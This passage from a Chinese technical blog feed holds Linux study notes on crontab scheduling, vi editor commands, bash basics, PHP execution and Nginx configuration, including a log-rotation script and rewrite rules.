        <content type="html"><![CDATA[<p>cron是一个linux下的定时执行工具</p><a id="more"></a><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><p>cron服务提供crontab命令来设定cron服务的，以下是这个命令的一些参数与说明：<br>crontab -u //设定某个用户的cron服务，一般root用户在执行这个命令的时候需要此参数<br>crontab -l //列出某个用户cron服务的详细内容<br>crontab -r //删除某个用户的cron服务<br>crontab -e //编辑某个用户的cron服务<br>比如说root查看自己的cron设置：crontab -u root -l<br>再例如，root想删除fred的cron设置：crontab -u fred -r<br>在编辑cron服务时，编辑的内容有一些格式和约定，输入：crontab -u root -e</p><h2 id="新增调度任务"><a href="#新增调度任务" class="headerlink" title="新增调度任务"></a>新增调度任务</h2><p>1、在命令行输入: crontab -e 然后添加相应的任务，wq存盘退出。<br>2、直接编辑/etc/crontab 文件，即vi /etc/crontab，添加相应的任务。</p><h2 id="查看调度任务"><a href="#查看调度任务" class="headerlink" title="查看调度任务"></a>查看调度任务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l //列出当前的所有调度任务</span><br><span class="line">crontab -u root -l   //列出用户root的所有调度任务</span><br></pre></td></tr></table></figure><h2 id="删除任务调度工作"><a href="#删除任务调度工作" class="headerlink" title="删除任务调度工作"></a>删除任务调度工作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crontab -r  //删除所有任务调度工作</span><br></pre></td></tr></table></figure><h2 id="任务调度执行结果的转向"><a href="#任务调度执行结果的转向" class="headerlink" title="任务调度执行结果的转向"></a>任务调度执行结果的转向</h2><p>例1：每天5：30执行ls命令，并把结果输出到/jp/test文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">30 5 * * * ls &gt;/jp/<span class="built_in">test</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>注：2&gt;&amp;1 表示执行结果及错误信息,详情可见bash shell学习笔记</p><h2 id="crontab编辑格式"><a href="#crontab编辑格式" class="headerlink" title="crontab编辑格式"></a>crontab编辑格式</h2><p>进入vi编辑模式，编辑的内容一定要符合下面的格式：<em>/1 </em> <em> </em> * ls &gt;&gt; /tmp/ls.txt</p><p>这个格式的前一部分是对时间的设定，后面一部分是要执行的命令，如果要执行的命令太多，可以把这些命令写到一个脚本里面，然后在这里直接调用这个脚本就可以了，调用的时候记得写出命令的完整路径。时间的设定我们有一定的约定，前面五个<em>号代表五个数字，数字的取值范围和含义如下：<br>分钟　（0-59）<br>小時　（0-23）<br>日期　（1-31）<br>月份　（1-12）<br>星期　（0-6）//0代表星期天<br>除了数字还有几个个特殊的符号就是”</em>“、”/“和”-“、”,”，<em>代表所有的取值范围内的数字，”/“代表每的意思,”</em>/5”表示每5个单位，”-“代表从某个数字到某个数字,”,”分开几个离散的数字</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li><p>1、指定每小时的第5分钟执行一次ls命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 * * * * ls</span><br></pre></td></tr></table></figure></li><li><p>2、指定每天的 5:30 执行ls命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 5 * * * ls</span><br></pre></td></tr></table></figure></li><li><p>3、指定每月8号的7：30分执行ls命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 7 8 * * ls</span><br></pre></td></tr></table></figure></li><li><p>4、指定每年的6月8日5：30执行ls命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 5 8 6 * ls</span><br></pre></td></tr></table></figure></li><li><p>5、指定每星期日的6:30执行ls命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 6 * * 0 ls</span><br></pre></td></tr></table></figure></li></ul><p>注：0表示星期天，1表示星期1，以此类推，也可以用英文来表示，sun表示星期天，mon表示星期一等。</p><ul><li>6、每月10号及20号的3：30执行ls命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 3 10,20 * * ls</span><br></pre></td></tr></table></figure></li></ul><p>注：“，”用来连接多个不连续的时段</p><ul><li>7、每天8-11点的第25分钟执行ls命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25 8-11 * * * ls</span><br></pre></td></tr></table></figure></li></ul><p>注：“-”用来连接连续的时段</p><ul><li>8、每15分钟执行一次ls命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * ls</span><br></pre></td></tr></table></figure></li></ul><p>即每个小时的第0 15 30 45 60分钟执行ls命令</p><ul><li>9、每个月中，每隔10天6:30执行一次ls命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 6 */10 * * ls</span><br></pre></td></tr></table></figure></li></ul><p>即每月的1、11、21、31日是的6：30执行一次ls命令。</p><ul><li>10、每天7：50以root 身份执行/etc/cron.daily目录中的所有可执行文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 7 * * * root run-parts /etc/cron.daily</span><br></pre></td></tr></table></figure></li></ul><p>注：run-parts参数表示，执行后面目录中的所有可执行文件</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux学习之文本编辑器</title>
      <link href="/2018/09/11/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"/>
      <url>/2018/09/11/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>i编辑器是所有Unix及Linux系统下标准的编辑器，这里只是简单地总结一下它的用法和一小部分指令。<br><a id="more"></a></p><h1 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h1><h2 id="vi三种状态"><a href="#vi三种状态" class="headerlink" title="vi三种状态"></a>vi三种状态</h2><ul><li>1) 命令模式(command mode） </li></ul><p>　　控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 </p><ul><li>2) 输入模式（Insert mode） </li></ul><p>　　只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令模式。 </p><ul><li>3) 末行模式（last line mode） </li></ul><p>　　将文件保存或退出vi，也可以设置编辑环境，如查找字符串、列出行号……等。<br>　　不过一般我们在使用时把vi简化成两个模式，就是将末行模式（last linemode）也算入命令模式（command mode）。</p><h2 id="命令模式功能键"><a href="#命令模式功能键" class="headerlink" title="命令模式功能键"></a>命令模式功能键</h2><ul><li>1）. 输入模式 </li></ul><p>　　按「i」切换进入输入模式「insert mode」，按“i”进入输入模式后是从光标当前位置开始输入文件；<br>　　按「a」进入输入模式后，是从目前光标所在位置的下一个位置开始输入文字；<br>　　按「o」进入输入模式后，是插入新的一行，从行首开始输入文字。 </p><ul><li><p>2）. 从输入模式切换为命令模式<br>　　<br> 按「ESC」键。 </p></li><li><p>3）. 移动光标 </p></li></ul><p>　　vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。<br>　　按「ctrl」+「b」：屏幕往“后”移动一页。<br>　　按「ctrl」+「f」：屏幕往“前”移动一页。<br>　　按「ctrl」+「u」：屏幕往“后”移动半页。<br>　　按「ctrl」+「d」：屏幕往“前”移动半页。<br>　　按数字「0」：移到文章的开头。<br>   按「G」：移动到文章的最后。<br>　　按「$」：移动到光标所在行的“行尾”。<br>　　按「^」：移动到光标所在行的“行首”<br>　　按「w」：光标跳到下个字的开头<br>　　按「e」：光标跳到下个字的字尾<br>　　按「b」：光标回到上个字的开头<br>　　按「#l」：光标移到该行的第#个位置，如：5l,56l。 </p><ul><li>4）. 删除文字 </li></ul><p>　　「x」：每按一次，删除光标所在位置的“后面”一个字符。<br>　　「#x」：例如，「6x」表示删除光标所在位置的“后面”6个字符。<br>　　「X」：大写的X，每按一次，删除光标所在位置的“前面”一个字符。<br>　　「#X」：例如，「20X」表示删除光标所在位置的“前面”20个字符。<br>　　「dd」：删除光标所在行。<br>　　「#dd」：从光标所在行开始删除#行 </p><ul><li>5）. 复制 </li></ul><p>　　「yw」：将光标所在之处到字尾的字符复制到缓冲区中。<br>　　「#yw」：复制#个字到缓冲区<br>　　「yy」：复制光标所在行到缓冲区。<br>　　「#yy」：例如，「6yy」表示拷贝从光标所在的该行“往下数”6行文字。<br>　　「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与“y”有关的复制命令都必须与“p”配合才能完成复制与粘贴功能。</p><ul><li><p>6）. 替换 </p><p>  「r」：替换光标所在处的字符。<br>  「R」：替换光标所到之处的字符，直到按下「ESC」键为止。</p></li><li><p>7）. 恢复上一次操作<br>　　 「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作。按多次“u”可以执行多次回复。 </p></li><li><p>8）. 更改 </p></li></ul><p>　　 「cw」：更改光标所在处的字到字尾处<br>　　 「c#w」：例如，「c3w」表示更改3个字 </p><ul><li>9）. 跳至指定的行 </li></ul><p>　　 「ctrl」+「g」列出光标所在行的行号。<br>　　 「#G」：例如，「15G」，表示移动光标至文章的第15行行首。</p><h2 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h2><p>在使用「last line mode」之前，请记住先按「ESC」键确定您已经处于「command mode」下后，再按「：」冒号即可进入「last line mode」。 </p><ul><li><p>A) 列出行号<br>　<br>  「set nu」：输入「set nu」后，会在文件中的每一行前面列出行号。 </p></li><li><p>B) 跳到文件中的某一行 </p></li></ul><p>　  「#」：「#」号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再回车，就会跳到文章的第15行。 </p><ul><li><p>C) 查找字符<br>　<br>  「/关键字」：先按「/」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往后寻找到您要的关键字为止。</p></li><li><p>D) 保存文件<br>　<br>  「w」：在冒号输入字母「w」就可以将文件保存起来。 </p></li><li><p>E) 离开vi<br>　<br>  「q」：按「q」就是退出，如果无法离开vi，可以在「q」后跟一个「!」强制离开vi。<br>　   「wq」：一般建议离开时，搭配「w」一起使用，这样在退出的时候还可以保存文件。 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx优化篇</title>
      <link href="/2018/09/10/Nginx%E4%BC%98%E5%8C%96%E7%AF%87/"/>
      <url>/2018/09/10/Nginx%E4%BC%98%E5%8C%96%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>Nginx大访问量优化以及实践，了解一下<br><a id="more"></a></p><h1 id="大访问量优化整体思路"><a href="#大访问量优化整体思路" class="headerlink" title="大访问量优化整体思路"></a>大访问量优化整体思路</h1><h2 id="减少请求"><a href="#减少请求" class="headerlink" title="减少请求"></a>减少请求</h2><ul><li>合并css,背景图片，减少mysql查询</li><li>使用nginx的expires，利用浏览器缓存，减少请求</li><li>利用cdn来响应请求</li></ul><h2 id="对于不可避免的请求做服务集群-负载均衡"><a href="#对于不可避免的请求做服务集群-负载均衡" class="headerlink" title="对于不可避免的请求做服务集群+负载均衡"></a>对于不可避免的请求做服务集群+负载均衡</h2><p>把任务平均分发到服务器中。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p><img src="架构.png" alt=""></p><h2 id="配置B号Nginx静态缓存"><a href="#配置B号Nginx静态缓存" class="headerlink" title="配置B号Nginx静态缓存"></a>配置B号Nginx静态缓存</h2>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php底层原理学习</title>
      <link href="/2018/09/09/php%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/09/php%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>知其然，知其所以然。<br><a id="more"></a></p><h1 id="PHP代码的执行过程"><a href="#PHP代码的执行过程" class="headerlink" title="PHP代码的执行过程"></a>PHP代码的执行过程</h1><p><img src="php底层实现.png" alt=""></p><p>php执行过程：</p><p>PHP稍有特殊之处,虽然是一个脚本语言,但不是靠解释器解释.<br>而是 zend 虚拟机,屏蔽了操作系统的区别.<br>php代码编译成opcode, 由zend虚拟机来执行opcode.<br>但是PHP脚本一结束,opcode就清除了</p><h1 id="变量的底层实现"><a href="#变量的底层实现" class="headerlink" title="变量的底层实现"></a>变量的底层实现</h1>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux学习之bash_shell</title>
      <link href="/2018/09/09/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8Bbash-shell/"/>
      <url>/2018/09/09/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8Bbash-shell/</url>
      
        <content type="html"><![CDATA[<p>比php还简单的bash，了解一下</p><a id="more"></a><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h1><p>几乎所有的讲解编程的书给读者的第一个例子都是 Hello World 程序，那么我们今天也就从这个例子出发，来逐步了解 BASH。<br>用 vim 编辑器编辑一个 hello 文件如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="comment"># This is a very simple example</span></span><br><span class="line"><span class="built_in">echo</span> “Hello World”</span><br></pre></td></tr></table></figure></p><ul><li>一，第一行的 #! 是什么意思</li></ul><p>#! 是说明 hello 这个文件的类型的，有点类似于 Windows 系统下用不同文件后缀来表示不同文件类型的意思（但不相同）。Linux 系统根据 “#!” 及该字串后面的信息确定该文件的类型</p><ul><li>二，第一行的 /bin/bash 又是什么意思</li></ul><p>在 BASH 中 第一行的 “#!” 及后面的 “/bin/bash” 就表明该文件是一个 BASH 程序，需要由 /bin 目录下的 bash 程序来解释执行。BASH 这个程序一般是存放在 /bin 目录下，如果你的 Linux 系统比较特别，bash 也有可能被存放在 /sbin 、/usr/local/bin 、/usr/bin 、/usr/sbin 或 /usr/local/sbin 这样的目录下；如果还找不到，你可以用 “locate bash” “find / -name bash 2&gt; /dev/null” 或 “whereis bash” 这三个命令找出 bash 所在的位置；如果仍然找不到，那你可能需要自己动手安装一个 BASH 软件包了</p><ul><li><p>三，第二行是注释吗<br>第二行的 “# This is a …” 就是 BASH 程序的注释，在 BASH 程序中从“#”号（注意：后面紧接着是“!”号的除外）开始到行尾的多有部分均被看作是程序的注释。</p></li><li><p>四，echo 语句<br>三行的 echo 语句的功能是把 echo 后面的字符串输出到标准输出中去。由于 echo 后跟的是 “Hello World” 这个字符串，因此 “Hello World”这个字串就被显示在控制台终端的屏幕上了。需要注意的是 BASH 中的绝大多数语句结尾处都没有分号。</p></li><li><p>五，如何执行该程序</p></li></ul><p>如何执行该程序呢？有两种方法：一种是显式制定 BASH 去执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bash hello.sh 或</span><br><span class="line">$ sh hello.sh</span><br></pre></td></tr></table></figure></p><p>（这里 sh 是指向 bash 的一个链接，<br>“lrwxrwxrwx 1 root root 4 Aug 20 05:41 /bin/sh -&gt; bash”）</p><p>或者可以先将 hello 文件改为可以执行的文件，然后直接运行它，此时由于 hello 文件第一行的 “#! /bin/bash” 的作用，系统会自动用/bin/bash 程序去解释执行 hello 文件的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod a+x hello.sh</span><br><span class="line">$ ./hello.sh</span><br></pre></td></tr></table></figure></p><p>此处没有直接 “$ hello.sh”是因为当前目录不是当前用户可执行文件的默认目录，而将当前目录“.”设为默认目录是一个不安全的设置。<br>需要注意的是，BASH 程序被执行后，实际上 Linux 系统是另外开设了一个进程来运行的。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx应用篇</title>
      <link href="/2018/09/09/Nginx%E5%BA%94%E7%94%A8%E7%AF%87/"/>
      <url>/2018/09/09/Nginx%E5%BA%94%E7%94%A8%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>应用篇主要学习以下几项：</p><ul><li>Nginx虚拟主机配置</li><li>Nginx日志切割</li><li>Nginx与gzip设置</li><li>Nginx与浏览器缓存配置</li><li>Nginx反向代理</li><li>nginx 与memcached的组合</li></ul><a id="more"></a><h1 id="Nginx虚拟主机配置"><a href="#Nginx虚拟主机配置" class="headerlink" title="Nginx虚拟主机配置"></a>Nginx虚拟主机配置</h1><h2 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h2><p>nginx.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 全局区</span><br><span class="line">worker_processes 1; // 有1个工作的子进程,可以自行修改,但太大无益,因为要争夺CPU,一般设置为 CPU数*核数</span><br><span class="line"></span><br><span class="line">Event &#123;</span><br><span class="line">// 一般是配置nginx连接的特性</span><br><span class="line">// 如1个word能同时允许多少连接</span><br><span class="line"> worker_connections  1024; // 这是指 一个子进程最大允许连1024个连接</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;  //这是配置http服务器的主要段</span><br><span class="line">     Server &#123; // 这是虚拟主机段</span><br><span class="line">       </span><br><span class="line">            Location &#123;  //定位,把特殊的路径或文件再次定位 ,如image目录单独处理</span><br><span class="line">            &#125;             /// 如.php单独处理</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Server &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a>虚拟主机配置</h2><h3 id="基于域名的虚拟主机"><a href="#基于域名的虚拟主机" class="headerlink" title="基于域名的虚拟主机"></a>基于域名的虚拟主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;  <span class="comment">#监听端口</span></span><br><span class="line">    server_name a.com; <span class="comment">#监听域名</span></span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">            root /var/www/a.com;   <span class="comment">#根目录定位</span></span><br><span class="line">            index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于端口的虚拟主机配置"><a href="#基于端口的虚拟主机配置" class="headerlink" title="基于端口的虚拟主机配置"></a>基于端口的虚拟主机配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 8080;</span><br><span class="line">    server_name 192.168.1.204;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">            root /var/www/html8080;</span><br><span class="line">            index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h1><p>在nginx的server段,我们可以看到日志的存储路径</p><p> #access_log  logs/host.access.log  main;<br>这说明 该server, 它的访问日志的文件是  logs/host.access.log ,</p><p>使用的格式”main”格式.</p><p>除了main格式,你可以自定义其他格式.</p><h2 id="main格式是什么"><a href="#main格式是什么" class="headerlink" title="main格式是什么?"></a>main格式是什么?</h2><p>在http段中，我们可以看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line"><span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line"><span class="string">'"$http_user_agent" "$http_x_forwarded_for"'</span>;</span><br></pre></td></tr></table></figure><p>main格式是我们定义好一种日志的格式,并起个名字,便于引用.</p><p>默认的日志格式: main<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">log_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line"><span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line"><span class="string">'"$http_user_agent" "$http_x_forwarded_for"'</span>;</span><br></pre></td></tr></table></figure></p><p>如默认的main日志格式,记录这么几项<br>远程IP- 远程用户/用户时间 请求方法(如GET/POST) 请求体body长度 referer来源信息<br>http-user-agent用户代理/蜘蛛 ,被转发的请求的原始IP</p><p>http_x_forwarded_for:在经过代理时,代理把你的本来IP加在此头信息中,传输你的原始IP</p><h2 id="自定义自己的日志格式"><a href="#自定义自己的日志格式" class="headerlink" title="自定义自己的日志格式"></a>自定义自己的日志格式</h2><p>2: 声明一个独特的log_format并命名</p><pre><code>log_format  mylog &apos;$remote_addr- &quot;$request&quot; &apos;                 &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;                    &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</code></pre><p>在下面的server/location,我们就可以引用 mylog</p><p>在server段中,这样来声明</p><p>Nginx允许针对不同的server做不同的Log ,(有的web服务器不支持,如lighttp)</p><p>access_log logs/access_8080.log mylog;<br>声明log   log位置          log格式;</p><h2 id="日志切割"><a href="#日志切割" class="headerlink" title="日志切割"></a>日志切割</h2><p>问题：假如每天的访问量很大，日志文件会越来越大，造成后期不好管理以及处理，我们就需要对日志进行切割</p><p>解决方案：</p><p>shell+定时任务+nginx信号管理，完成日志按日期存储</p><p>分析思路：</p><ul><li>凌晨 00:00:01 把昨天的日志重名，放在相应的目录下</li><li>再用信号USR1控制Nginx重新生成新的日志文件</li></ul><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="bash脚本"><a href="#bash脚本" class="headerlink" title="bash脚本"></a>bash脚本</h4><p>log.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">base_path=<span class="string">'/usr/local/nginx/logs'</span></span><br><span class="line">log_path=$(date -d yesterday +<span class="string">"%Y%m"</span>)</span><br><span class="line">day=$(date -d yesterday +<span class="string">"%d"</span>)</span><br><span class="line">mkdir -p <span class="variable">$base_path</span>/<span class="variable">$log_path</span></span><br><span class="line">mv <span class="variable">$base_path</span>/access.log <span class="variable">$base_path</span>/<span class="variable">$log_path</span>/access_<span class="variable">$day</span>.<span class="built_in">log</span></span><br><span class="line"><span class="built_in">kill</span> -USR1 `cat /usr/<span class="built_in">local</span>/nginx/logs/nginx.pid`</span><br></pre></td></tr></table></figure></p><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Crontab 编辑定时任务<br>01 00 <em> </em> * /xxx/path/log.sh  每天0时1分(建议在02-04点之间,系统负载小)</p><h1 id="Nginx与gzip设置"><a href="#Nginx与gzip设置" class="headerlink" title="Nginx与gzip设置"></a>Nginx与gzip设置</h1><h2 id="location-语法"><a href="#location-语法" class="headerlink" title="location 语法"></a>location 语法</h2><p>location匹配可分为三种：</p><ul><li><p>location = patt {} [精准匹配]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location = / &#123;</span><br><span class="line">              root   /var/www/html/;</span><br><span class="line">             index  index.htm index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>location patt{}  [一般匹配]</p></li></ul><ul><li>location ~ patt{} [正则匹配]<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    location ~ image &#123;</span><br><span class="line">           root /var/www/; //注意此处不用再写img目录</span><br><span class="line">           index index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="匹配准则总结"><a href="#匹配准则总结" class="headerlink" title="匹配准则总结"></a>匹配准则总结</h2><p><img src="location.png" alt=""></p><h2 id="rewrite重写"><a href="#rewrite重写" class="headerlink" title="rewrite重写"></a>rewrite重写</h2><p>重写中用到的指令</p><ul><li>if  (条件) {}  设定条件,再进行重写 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If 空格 (条件) &#123;</span><br><span class="line">    重写模式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件又怎么写?<br>答:3种写法<br>1: “=”来判断相等, 用于字符串比较<br>2: “~” 用正则来匹配(此处的正则区分大小写)<br>   ~* 不区分大小写的正则<br>3: -f -d -e来判断是否为文件,为目录,是否存在.</p><p>例子：</p><ul><li>禁用IP</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  (<span class="variable">$remote_addr</span> = 192.168.1.100) &#123;</span><br><span class="line">                <span class="built_in">return</span> 403;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><ul><li>ie浏览器重写</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ MSIE) &#123;</span><br><span class="line">               rewrite ^.*$ /ie.htm;</span><br><span class="line">               <span class="built_in">break</span>; <span class="comment">#(不break会循环重定向)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>自定义404页面</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!-e <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>) &#123;</span><br><span class="line">              rewrite ^.*$ /404.html <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>set #设置变量</li></ul><p>例子如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~* msie) &#123;</span><br><span class="line">      <span class="built_in">set</span> <span class="variable">$isie</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$fastcgi_script_name</span> = ie.html) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$isie</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$isie</span> 1) &#123;</span><br><span class="line">    rewrite ^.*$ ie.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>return 